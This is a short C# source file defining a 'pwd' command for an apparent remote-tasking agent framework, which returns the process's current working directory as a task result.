using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class PrintWorkingDirectoryCommand : AgentCommand
    {
        public override string Name => "pwd";
        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
        {
            result.Result = Directory.GetCurrentDirectory();
        }
    }
}
